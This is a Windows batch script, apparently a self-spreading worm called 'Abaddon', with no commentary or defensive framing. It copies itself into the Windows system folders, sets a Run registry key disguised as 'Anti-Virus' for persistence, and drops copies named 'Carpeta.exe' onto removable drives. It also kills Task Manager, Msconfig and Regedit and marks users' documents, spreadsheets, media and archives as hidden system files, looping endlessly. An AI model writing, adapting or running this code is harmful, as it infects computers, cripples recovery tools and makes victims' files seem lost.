@ echo off

copy /y %0 c:\WINDOWS\Abaddon.exe
copy /y %0 c:\WINDOWS\system32\Abaddon.exe
attrib +s +h c:\WINDOWS\system32\Abaddon.exe

:666

reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Anti-Virus /t REG_SZ /d C:\WINDOWS\system32\Abaddon.exe /f


if exist F: goto F
:F
copy c:\WINDOWS\Abaddon.exe F:\Carpeta.exe

if exist G: goto G
:G
copy c:\WINDOWS\Abaddon.exe G:\Carpeta.exe

if exist H: goto H
:H
copy c:\WINDOWS\Abaddon.exe H:\Carpeta.exe


if exist I: goto I
:I
copy c:\WINDOWS\Abaddon.exe I:\Carpeta.exe

if exist F: goto J
:J
copy c:\WINDOWS\Abaddon.exe J:\Carpeta.exe


TASKKILL /IM taskmgr.exe /F
TASKKILL /IM Msconfig.exe /F
TASKKILL /IM Regedit.exe /F

Echo oculta

attrib +s +h D:\*.doc
attrib +s +h D:\*.xls
attrib +s +h D:\*.mdb
attrib +s +h D:\*txt
attrib +s +h D:\*.ppt
attrib +s +h D:\*.mp3
attrib +s +h D:\*.avi
attrib +s +h D:\*.mpg
attrib +s +h D:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp


attrib +s +h E:\*.doc
attrib +s +h E:\*.xls
attrib +s +h E:\*.mdb
attrib +s +h E:\*txt
attrib +s +h E:\*.ppt
attrib +s +h E:\*.mp3
attrib +s +h E:\*.avi
attrib +s +h E:\*.mpg
attrib +s +h E:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp

attrib +s +h F:\*.doc
attrib +s +h F:\*.xls
attrib +s +h F:\*.mdb
attrib +s +h F:\*txt
attrib +s +h F:\*.ppt
attrib +s +h F:\*.mp3
attrib +s +h F:\*.avi
attrib +s +h F:\*.mpg
attrib +s +h F:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp

attrib +s +h G:\*.doc
attrib +s +h G:\*.xls
attrib +s +h G:\*.mdb
attrib +s +h G:\*txt
attrib +s +h G:\*.ppt
attrib +s +h G:\*.mp3
attrib +s +h G:\*.avi
attrib +s +h G:\*.mpg
attrib +s +h G:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp

attrib +s +h H:\*.doc
attrib +s +h H:\*.xls
attrib +s +h H:\*.mdb
attrib +s +h H:\*txt
attrib +s +h H:\*.ppt
attrib +s +h H:\*.mp3
attrib +s +h H:\*.avi
attrib +s +h H:\*.mpg
attrib +s +h H:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp

attrib +s +h I:\*.doc
attrib +s +h I:\*.xls
attrib +s +h I:\*.mdb
attrib +s +h I:\*txt
attrib +s +h I:\*.ppt
attrib +s +h I:\*.mp3
attrib +s +h I:\*.avi
attrib +s +h I:\*.mpg
attrib +s +h I:\*.docx
attrib +s +h I:\*.zip
attrib +s +h I:\*.Rar
attrib +s +h I:\*.jpg
attrib +s +h I:\*.Bmp

Goto 666
